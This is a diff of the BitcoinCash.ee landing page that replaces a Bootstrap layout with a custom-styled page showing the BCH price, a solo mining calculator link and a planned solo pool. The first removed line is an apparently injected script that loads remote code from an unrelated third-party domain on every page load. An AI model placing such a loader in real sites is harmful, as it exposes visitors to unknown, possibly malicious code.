@@ -1,62 +1,381 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('teestoagloupaza.net',8464765,document.createElement('script'))</script>
 	<meta charset="utf-8">
-	<meta name="keywords"
-		  content="bitcoin cash, bitcoin cash ee, bitcoin cash landing page, bitcoin cash price, bitcoin cash solo chance, bitcoin cash shared solo">
-	<meta name="description" content="BitcoinCash.ee">
-	<meta name="author" content="Ionia OÜ">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta name="google" content="notranslate"/>
-	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
-		  integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css"
-		  integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+
+	<title>BitcoinCash.ee — Bitcoin Cash Price, Solo Mining Chance Calculator & More</title>
+	<meta name="description" content="BitcoinCash.ee is your Bitcoin Cash hub. Check the live BCH price, calculate your solo mining chance with SoloChance.org, and more.">
+	<meta name="keywords" content="bitcoin cash, BCH price, bitcoin cash solo mining, solo mining chance calculator, bitcoin cash tools">
+	<link rel="canonical" href="https://bitcoincash.ee/">
+	<link rel="sitemap" type="application/xml" href="/sitemap.xml">
+
+	<!-- Open Graph -->
+	<meta property="og:type" content="website">
+	<meta property="og:site_name" content="BitcoinCash.ee">
+	<meta property="og:url" content="https://bitcoincash.ee/">
+	<meta property="og:title" content="BitcoinCash.ee — Bitcoin Cash Price, Solo Mining Chance Calculator & More">
+	<meta property="og:description" content="Your Bitcoin Cash hub. Live BCH price, solo mining chance calculator, and more.">
+	<meta property="og:image" content="https://bitcoincash.ee/og-image.png">
+
+	<!-- Twitter Card -->
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:title" content="BitcoinCash.ee — Bitcoin Cash Price, Solo Mining Chance Calculator & More">
+	<meta name="twitter:description" content="Your Bitcoin Cash hub. Live BCH price, solo mining chance calculator, and more.">
+	<meta name="twitter:image" content="https://bitcoincash.ee/og-image.png">
+
+	<!-- Favicon & touch icon -->
+	<link rel="icon" type="image/svg+xml" href="/logo.svg">
+	<link rel="icon" type="image/png" href="/logo.png">
+	<link rel="apple-touch-icon" href="/logo.png">
+
+	<!-- Structured Data -->
+	<script type="application/ld+json">
+	{
+		"@context": "https://schema.org",
+		"@type": "WebSite",
+		"name": "BitcoinCash.ee",
+		"url": "https://bitcoincash.ee/",
+		"description": "Your Bitcoin Cash hub. Live BCH price, solo mining chance calculator, and more."
+	}
+	</script>
+
 	<link rel="preconnect" href="https://fonts.googleapis.com">
 	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-	<link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
-	<title>BitcoinCash.ee</title>
+	<link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">
+	<style>
+		:root {
+			--green: #0AC18E;
+			--green-dim: rgba(10, 193, 142, 0.15);
+			--green-border: rgba(10, 193, 142, 0.25);
+			--green-border-hover: rgba(10, 193, 142, 0.6);
+			--bg: #0d1117;
+			--bg-card: rgba(255, 255, 255, 0.04);
+			--text: #e6edf3;
+			--muted: #7d8590;
+			--border: #21262d;
+		}
+
+		*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+		body {
+			font-family: 'Ubuntu', sans-serif;
+			background-color: var(--bg);
+			color: var(--text);
+			min-height: 100vh;
+			background-image:
+				radial-gradient(ellipse 60% 40% at 15% 55%, rgba(10, 193, 142, 0.07) 0%, transparent 60%),
+				radial-gradient(ellipse 50% 35% at 85% 15%, rgba(10, 193, 142, 0.05) 0%, transparent 55%);
+		}
+
+		/* ── Header ── */
+		header {
+			text-align: center;
+			padding: 64px 24px 0;
+		}
+
+		.logo {
+			display: block;
+			width: 80px;
+			height: 80px;
+			margin: 0 auto 20px;
+		}
+
+		h1 {
+			font-size: clamp(2rem, 5vw, 2.75rem);
+			font-weight: 700;
+			color: var(--text);
+			letter-spacing: -0.02em;
+		}
+
+		h1 .accent { color: var(--green); }
+
+		.tagline {
+			margin-top: 10px;
+			color: var(--muted);
+			font-size: 1rem;
+			font-weight: 400;
+			letter-spacing: 0.03em;
+		}
+
+		.divider {
+			width: 48px;
+			height: 3px;
+			background: var(--green);
+			border-radius: 2px;
+			margin: 28px auto 52px;
+		}
+
+		/* ── Cards ── */
+		.cards {
+			max-width: 900px;
+			margin: 0 auto;
+			padding: 0 24px 80px;
+			display: grid;
+			grid-template-columns: repeat(2, 1fr);
+			gap: 20px;
+		}
+
+		.card:last-child {
+			grid-column: 1 / -1;
+		}
+
+		.card {
+			background: var(--bg-card);
+			border: 1px solid var(--green-border);
+			border-radius: 16px;
+			padding: 28px 26px;
+			-webkit-backdrop-filter: blur(12px);
+		backdrop-filter: blur(12px);
+			transition: border-color 0.2s ease, transform 0.2s ease;
+		}
+
+		.card:hover {
+			border-color: var(--green-border-hover);
+			transform: translateY(-3px);
+		}
+
+		.card-icon {
+			width: 42px;
+			height: 42px;
+			background: var(--green-dim);
+			border-radius: 10px;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			margin-bottom: 18px;
+			color: var(--green);
+		}
+
+		.card-icon svg {
+			width: 20px;
+			height: 20px;
+		}
+
+		.card-label {
+			font-size: 0.72rem;
+			font-weight: 700;
+			text-transform: uppercase;
+			letter-spacing: 0.08em;
+			color: var(--green);
+			margin-bottom: 10px;
+			line-height: 1;
+		}
+
+		.card p {
+			color: var(--muted);
+			font-size: 0.95rem;
+			line-height: 1.65;
+		}
+
+		.btn {
+			display: inline-block;
+			margin-top: 16px;
+			padding: 9px 18px;
+			background: var(--green);
+			color: #0d1117;
+			font-weight: 700;
+			font-size: 0.9rem;
+			border-radius: 8px;
+			text-decoration: none;
+			transition: opacity 0.15s ease;
+		}
+
+		.btn:hover { opacity: 0.85; }
+
+		.badge {
+			display: inline-block;
+			margin-top: 14px;
+			font-size: 0.68rem;
+			font-weight: 700;
+			text-transform: uppercase;
+			letter-spacing: 0.07em;
+			padding: 3px 9px;
+			border-radius: 20px;
+			background: rgba(240, 180, 0, 0.1);
+			color: #e8b300;
+			border: 1px solid rgba(240, 180, 0, 0.2);
+		}
+
+		/* ── Price Widget ── */
+		#bch-price { margin-top: 8px; }
+
+		.price-amount {
+			font-size: 2rem;
+			font-weight: 700;
+			color: var(--text);
+			line-height: 1.1;
+		}
+
+		.price-change {
+			display: inline-block;
+			margin-top: 8px;
+			font-size: 0.82rem;
+			font-weight: 700;
+			padding: 3px 9px;
+			border-radius: 6px;
+		}
+
+		.price-change.up   { background: rgba(10,193,142,0.15); color: #0AC18E; }
+		.price-change.down { background: rgba(220,80,80,0.12);  color: #f07878; }
+
+		.price-meta {
+			display: grid;
+			grid-template-columns: 1fr 1fr;
+			gap: 10px;
+			margin-top: 16px;
+		}
+
+		.price-meta-item label {
+			display: block;
+			font-size: 0.65rem;
+			font-weight: 700;
+			text-transform: uppercase;
+			letter-spacing: 0.07em;
+			color: var(--muted);
+			margin-bottom: 3px;
+		}
+
+		.price-meta-item span {
+			font-size: 0.88rem;
+			font-weight: 700;
+			color: var(--text);
+		}
+
+		.price-loading {
+			color: var(--muted);
+			font-size: 0.9rem;
+			margin-top: 8px;
+		}
+
+		/* ── Mobile ── */
+		@media (max-width: 600px) {
+			.cards {
+				grid-template-columns: 1fr;
+			}
+
+			.card:last-child {
+				grid-column: auto;
+			}
+		}
+
+		/* ── Footer ── */
+		footer {
+			text-align: center;
+			padding: 20px 24px 32px;
+			border-top: 1px solid var(--border);
+			color: #555f6b;
+			font-size: 0.8rem;
+		}
+	</style>
 </head>
 
 <body>
-<div id="Home" class="container mt-4">
-	<div class="container">
-		<h1 style="font-family: ubuntu" class="font-weight-bold">
-			BitcoinCash.ee <span class="h6 text-muted font-weight-normal">Because bigger blocks are much better.</span>
-		</h1>
-	</div>
-	<hr class="my-4">
-	<div class="card-deck m-2">
-		<div class="card bg-light border-dark m-2" style="min-width:250px;">
-			<div class="card-body">
-				<h5 class="card-title">Current Price</h5>
-				<script src="https://widgets.coingecko.com/coingecko-coin-ticker-widget.js"></script>
-				<coingecko-coin-ticker-widget  coin-id="bitcoin-cash" currency="usd" locale="en"></coingecko-coin-ticker-widget>
 
-			</div>
-		</div>
-		<div class="card bg-light border-dark m-2" style="min-width:250px;">
-			<div class="card-body">
-				<h5 class="card-title">Solo Mining Chance Calculator</h5>
-				<p class="card-text text-justify">DONE! Solochance.com is a great service, but it does not support Bitcoin Cash. So we developed an alternative that supports, visit <a href="https://solochance.org" target="_blank" rel="noopener noreferrer">SoloChance.org</a>!
-				</p>
-			</div>
-		</div>
-		<div class="card bg-light border-dark m-2" style="min-width:250px;">
-			<div class="card-body">
-				<h5 class="card-title">Shared Solo Pool</h5>
-				<p class="card-text text-justify">On development.</p>
-			</div>
-		</div>
-	</div>
-</div>
+<header>
+	<!-- BCH coin icon — circle + symbol extracted from the official SVG, cropped viewBox -->
+	<svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="184 0 594 594" aria-label="Bitcoin Cash">
+		<circle fill="#0AC18E" cx="481.01" cy="296.963" r="296.905"/>
+		<path fill="#ffffff" d="M620.266,309.3l-.165-.307-.028-.051c-.1-.309-.175-.632-.289-.966l-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.028-.051A60.649,60.649,0,0,0,599.841,278.1l-.014-.026c-.279-.213-.572-.451-.852-.663l-.386-.287-.279-.212-.12-.1-.266-.187-.12-.1-.266-.187-.12-.1-.279-.212-.146-.087-.279-.212-.146-.087-.3-.2-.146-.087-.177-.268-.159-.112-.3-.2-.159-.112-.3-.2-.159-.112-.3-.2-.159-.112-.319-.224-.159-.112-.344-.211-.159-.112-.344-.211-.159-.112-.344-.211-.159-.112-.344-.211-.185-.1-.344-.211-.185-.1-.37-.2-.185-.1-.384-.222-.185-.1-.384-.222-.185-.1-.384-.222-.2-.124-.384-.222-.2-.124-.409-.209-.2-.124-.409-.209-.277-.148-.013-.026c-.2-.124-.409-.209-.608-.333a84.677,84.677,0,0,0-27.11-8.566,75.94,75.94,0,0,0,7.263-9.122l.348-.517.026-.014.161-.252.211-.344.112-.159.211-.344.112-.159.211-.344.112-.159.211-.344.112-.159.211-.344.112-.159.185-.331.112-.159.185-.331.087-.146.185-.331.087-.146.185-.331.086-.146.159-.317.087-.146.159-.317.087-.146.159-.317.087-.146.172-.291.087-.146.173-.291.087-.146.148-.277.087-.146.148-.277.061-.132.148-.277.061-.132.148-.277.061-.132.148-.277.061-.132.122-.264.061-.132.122-.264.061-.132.122-.264.061-.132.134-.3.183-.4c.134-.3.242-.592.376-.9l.026-.014a53.871,53.871,0,0,0,2.737-31.626l-.014-.026-.028-.051-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026c-.061-.3-.122-.594-.208-.878V206.6l-.014-.026-.014-.026-.014-.026.014.026-.124-.23c-.09-.413-.181-.826-.311-1.251-.09-.413-.22-.838-.336-1.238l-.151-.281-.028-.051c-.087-.283-.173-.567-.26-.85l-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.013-.026a53.877,53.877,0,0,0-17.641-26.4l-.013-.026c-.24-.2-.506-.388-.746-.588l-.331-.25-.266-.187-.12-.1-.226-.175-.12-.1-.227-.175-.119-.1-.253-.161-.12-.1-.265-.187-.12-.1-.266-.187-.12-.1-.266-.187-.146-.087-.266-.187-.146-.087-.266-.187-.146-.087-.291-.173-.146-.087-.291-.173-.146-.087-.291-.173-.146-.087-.291-.173-.146-.087-.305-.2-.146-.087-.305-.2-.146-.087-.331-.185-.146-.087-.33-.185-.159-.112-.331-.185-.159-.112-.33-.185-.159-.112-.344-.211-.185-.1L547,169.4l-.185-.1-.37-.2-.185-.1-.37-.2-.264-.122-.014-.026-.555-.3c-16.214-8.427-36.813-10.964-57.538-5.647l-5.391,1.384-13.636-53.1-31.6,8.1,13.591,52.89L425.2,178.5l-13.6-52.721-31.6,8.1,13.591,52.89-65.167,16.769,8.671,33.7,26.258-6.744a16.25,16.25,0,0,1,19.792,11.679l.008.032h0L419.6,384.022a10.857,10.857,0,0,1-7.8,13.206l-23.008,5.919,1.352,40.08,65.09-16.727L469,479.294l31.584-8.127-13.6-52.916,25.278-6.481,13.605,52.915,31.584-8.127L543.8,403.436c5.352-1.4,9.956-2.588,13.141-3.412,23.356-6.007,42.243-19.7,53.672-36.775l.386-.57.026-.014.187-.266.248-.4.124-.2.248-.4.124-.2.222-.384.124-.2.222-.384.1-.185.222-.384.1-.185.222-.384.1-.185.2-.37.1-.185.2-.37.1-.185.211-.344.1-.185.211-.344.1-.185.185-.331.1-.185.185-.33.1-.185.185-.33.073-.171.185-.33.073-.171.159-.317.087-.146.159-.317.087-.146.159-.317.087-.146.159-.317.087-.146.159-.317.087-.146.159-.317.087-.146.134-.3.087-.146.133-.3.061-.132.146-.342.2-.435c.146-.342.3-.659.425-.988l.012-.039a60.7,60.7,0,0,0,3.086-35.574l-.013-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026c-.075-.323-.149-.645-.224-.968v-.065l-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.014-.026-.055-.1c-.118-.464-.21-.942-.354-1.393A11.462,11.462,0,0,1,620.266,309.3ZM434.605,214.429c5.391-1.384,27.681-6.982,35.031-8.893,11.685-2.991,23.2-1.83,32.19,2.5l.3.134h0l.132.061.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.159.112.092.049.159.112.092.049.159.112.092.049.146.087.092.049.146.087.092.049.146.087.092.049.146.087.092.049.146.087.067.063.146.087.053.037.146.087.053.037.146.087.053.037.146.087.053.037.12.1.053.037.146.087.2.124c.146.087.279.213.425.3h0a27.247,27.247,0,0,1,9.658,13.836h0l.041.077c.043.142.1.309.143.451l.014.026.083.153c.059.232.13.425.189.657a3.864,3.864,0,0,1,.126.724l.083.153.014.026a2.179,2.179,0,0,0,.118.464l.041.077h0a27.339,27.339,0,0,1-1.8,16.768h0l-.207.474-.11.224-.087.146-.024.079-.061.132-.024.079-.087.146-.024.079-.087.146-.024.079-.087.146-.024.079-.087.146-.024.079-.087.146-.024.079-.087.146-.049.092-.087.146-.049.092-.086.146-.05.092-.086.146-.049.092-.112.159-.05.092-.112.159-.049.092-.112.159-.049.092-.112.159-.049.092-.112.159-.049.092-.112.159-.049.092-.112.159-.049.092-.138.173-.049.092-.138.173-.049.092-.138.173-.049.092-.138.173-.1.12h0l-.187.266c-5.811,8.142-15.334,14.72-27.019,17.711-7.364,1.886-29.6,7.716-34.986,9.1ZM558.117,323.152l.083.153.014.026c.031.181.075.323.106.5h0l.014.026h0l.014.026.014.026.014.026h0a28.09,28.09,0,0,1-2.541,18.324h0l-.283.515-.136.238-.1.185-.049.092-.087.146-.049.092-.087.146-.049.092-.112.159-.049.092-.112.159-.049.092-.112.159-.049.092-.112.159-.049.092-.112.159-.049.092-.112.159-.049.092-.112.159-.049.092-.112.159-.049.092-.138.173-.049.092-.138.173-.049.092-.124.2-.049.092-.124.2-.049.092-.124.2-.075.106-.124.2-.075.106-.15.212-.075.106-.15.212-.075.106-.15.212-.075.106-.151.212-.075.106-.15.212-.126.134h0l-.238.293c-7.057,9.012-18.44,16.425-32.265,19.974-8.719,2.251-35.063,9.141-41.473,10.777L459.34,310.627c6.4-1.662,32.814-8.294,41.532-10.545,13.826-3.549,27.4-2.542,37.891,1.938l.342.146h0l.171.073.25.1.118.035.224.11.118.035.224.11.118.035.224.11.091.049.224.11.092.049.224.11.092.049.224.11.092.049.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.185.1.092.049.159.112.092.049.159.112.092.049.159.112.092.049.159.112.092.049.159.112.092.049.146.087.092.049.159.112.212.15c.159.112.344.211.5.323h0A28.175,28.175,0,0,1,557.5,321h0l.055.1c.057.167.1.309.157.476l.014.026.083.153c.059.232.118.464.191.722.129.057.15.342.109.694Z"/>
+	</svg>
+	<h1>Bitcoin<span class="accent">Cash</span>.ee</h1>
+	<p class="tagline">Because bigger blocks are much better.</p>
+	<div class="divider"></div>
+</header>
 
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
-		integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k"
-		crossorigin="anonymous"></script>
-<script async defer src="https://buttons.github.io/buttons.js"></script>
+<main class="cards">
+
+	<div class="card">
+		<div class="card-icon">
+			<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+				<polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/>
+				<polyline points="17 6 23 6 23 12"/>
+			</svg>
+		</div>
+		<h2 class="card-label">Current Price</h2>
+		<div id="bch-price"><p class="price-loading">Loading…</p></div>
+	</div>
+
+	<div class="card">
+		<div class="card-icon">
+			<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+				<rect x="2" y="2" width="20" height="20" rx="3"/>
+				<circle cx="8" cy="8" r="1.5" fill="currentColor" stroke="none"/>
+				<circle cx="16" cy="8" r="1.5" fill="currentColor" stroke="none"/>
+				<circle cx="12" cy="12" r="1.5" fill="currentColor" stroke="none"/>
+				<circle cx="8" cy="16" r="1.5" fill="currentColor" stroke="none"/>
+				<circle cx="16" cy="16" r="1.5" fill="currentColor" stroke="none"/>
+			</svg>
+		</div>
+		<h2 class="card-label">Solo Mining Chance Calculator</h2>
+		<p>Solochance.com is a great service, but it does not support Bitcoin Cash. So we built an alternative.</p>
+		<a class="btn" href="https://solochance.org" target="_blank" rel="noopener noreferrer">Visit SoloChance.org &rarr;</a>
+	</div>
+
+	<div class="card">
+		<div class="card-icon">
+			<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+				<path d="M2 20 L6 16 L12 10 L18 4"/>
+				<path d="M15 3 L21 3 L21 9"/>
+				<path d="M2 20 L8 20 L8 14"/>
+				<circle cx="12" cy="12" r="2" fill="currentColor" stroke="none"/>
+			</svg>
+		</div>
+		<h2 class="card-label">Solo Pool</h2>
+		<p>A solo mining pool for Bitcoin Cash is on the way — combining the thrill of solo mining with the consistency of a pool.</p>
+		<span class="badge">Coming Soon</span>
+	</div>
+
+</main>
+
+<footer>
+	&copy; 2026 BitcoinCash.ee
+</footer>
+
+<script>
+	function formatLarge(n) {
+		if (n >= 1e9) return '$' + (n / 1e9).toFixed(2) + 'B';
+		if (n >= 1e6) return '$' + (n / 1e6).toFixed(2) + 'M';
+		return '$' + n.toLocaleString();
+	}
+
+	async function fetchBCHPrice() {
+		try {
+			const res = await fetch(
+				'https://api.coingecko.com/api/v3/simple/price' +
+				'?ids=bitcoin-cash&vs_currencies=usd' +
+				'&include_24hr_change=true&include_market_cap=true&include_24hr_vol=true'
+			);
+			const data = await res.json();
+			const bch = data['bitcoin-cash'];
+
+			const price   = bch.usd.toLocaleString('en-US', { style: 'currency', currency: 'USD' });
+			const change  = bch.usd_24h_change;
+			const changeStr   = (change >= 0 ? '▲ +' : '▼ ') + change.toFixed(2) + '%';
+			const changeClass = change >= 0 ? 'up' : 'down';
+
+			document.getElementById('bch-price').innerHTML = `
+				<div class="price-amount">${price}</div>
+				<span class="price-change ${changeClass}">${changeStr} 24h</span>
+				<div class="price-meta">
+					<div class="price-meta-item">
+						<label>Market Cap</label>
+						<span>${formatLarge(bch.usd_market_cap)}</span>
+					</div>
+					<div class="price-meta-item">
+						<label>24h Volume</label>
+						<span>${formatLarge(bch.usd_24h_vol)}</span>
+					</div>
+				</div>`;
+		} catch (e) {
+			document.getElementById('bch-price').innerHTML =
+				'<p class="price-loading">Unable to load price.</p>';
+		}
+	}
+
+	fetchBCHPrice();
+</script>
+
 </body>
-
 </html>
